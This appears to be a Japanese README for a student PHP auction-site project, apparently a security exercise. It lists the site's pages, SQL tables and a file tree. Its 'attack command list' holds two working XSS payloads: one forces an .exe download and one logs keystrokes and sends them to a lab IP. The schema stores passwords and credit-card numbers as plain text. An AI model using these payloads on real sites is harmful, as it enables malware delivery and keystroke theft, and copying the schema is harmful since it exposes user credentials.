## index.php
商品項目の表示、メインページ
## login.php
会員ログインページ
## registst1.php
会員情報登録ステップ1ページ
## registst2.php
会員情報登録ステップ2ページ
## register_complete
会員情報登録完了ページ
## mypage.php
現時点で登録されている情報を表示するページ
## registchange.php
現時点で登録されている情報（ユーザー名以外）を変更できるページ
## itemdatails.php
アイテムの詳細情報を表示するページ?item001等で指定するとその情報を表示
## test.php
送っていただいたデザインにデータベースの情報を表示できるように変更  

## bid.php
入札処理php表示等なし。

## 使用したSQL文

```sql:User Table
CREATE TABLE `User`(
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`mail` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'メールアドレス',
	`password` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'パスワード',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:UserAdd Table
CREATE TABLE `UserAdd` (
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`address` VARCHAR(255) NOT NULL DEFAULT '' COMMENT '住所',
	`phone` VARCHAR(11) NOT NULL DEFAULT 0 COMMENT '電話番号',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb3;
```

```sql:User_Credit Table
CREATE TABLE `User_Credit` (
    `user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
    `credit` VARCHAR(16) DEFAULT NULL COMMENT 'クレジット番号'
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:Item Table
CREATE TABLE `Item` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `item_name`  TEXT COMMENT 'アイテム名',
    `item_price` INT(7) NOT NULL DEFAULT 0 COMMENT '金額',
    `max_price` INT(7) NOT NULL DEFAULT 0 COMMENT '最高金額',
    `buy_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '入札者',
    `item_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '出品者ID',
    `is_sold` TINYINT(1) NOT NULL DEFAULT 0 COMMENT '売れたか売れてないかのフラグ',
    `category` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'カテゴリー', -- ここにカテゴリーを追加
    PRIMARY KEY (`item_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:Item_Image Table
CREATE TABLE `Item_Image` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `image_path` VARCHAR(255) NOT NULL DEFAULT ''
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

## アイテム情報表示のための仮sql登録文  
```sql:ItemInfo Regist
INSERT INTO `Item` (`item_id`, `item_name`, `item_price`, `max_price`, `item_user`)
VALUES
('item001', '商品A', 0,5000 ,'user001'),
('item002', '商品B', 0,10000 ,'user002'),
('item003', '商品C', 0, 15000,'user004'),
('item004', '商品D', 0, 20000,'user003');
```

```sql:Item_Image Regist
INSERT INTO `Item_Image` (`item_id`, `image_path`)
VALUES
('item001', './image/image1.png'),
('item001', './image/image2.png'),
('item002', './image/image3.png'),
('item003', './image/image4.png'),
('item004', './image/image5.png');
```

```sql:Item table 削除
drop table Item;
```


```sql:Item_Image table 削除
drop table Item_Image;
```
```sql:is_soldをすべて0に
UPDATE Item SET is_sold = 0;
```


## 攻撃コマンド一覧

```html:強制ダウンロード攻撃用コマンド（IPは各自のものに変更してください
aaa<script>        var link = document.createElement('a');        link.href = 'http://192.168.52.128/xss/sample.exe';        link.download = '';        document.body.appendChild(link);        link.click();    </script>

```



```html:キーロガー（IPは各自のものに変更してください
cc</div><script type="text/javascript">var keys='';document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;var obj = document.getElementById("div1");obj.innerText = keys;};window.setInterval(function(){new Image().src = 'http://192.168.52.128/keylogger.php?c='+keys;keys = '';}, 1000);</script><body><div id="div1"></div></body>

```
:::note info
phpを出品画面でアップして、
それぞれのリンク先を強制的にそのphpにすれば何かできるかも...？
:::

## ファイル情報ツリー
.  
├── a  
├── bag_category.png  
├── bid.php  
├── bike_category.png  
├── clothes_category.png  
├── database.php  
├── image //商品画像格納場所  
│   ├── image1.jpg  
│   ├── image2.jpg  
│   ├── image3.jpg  
│   ├── image4.jpg  
│   └── image5.jpg  
├── image_add.php  
├── index.php  
├── itemdetails.php  
├── login.php  
├── mypage.php  
├── readme.md  
├── registchange.php  
├── register_complete.php  
├── registst1.php  
├── registst2.php  
├── temp  
│   ├── bid_process.php  
│   ├── login1.php  
│   └── regist.php  
├── test.php  
└── watch_category.png  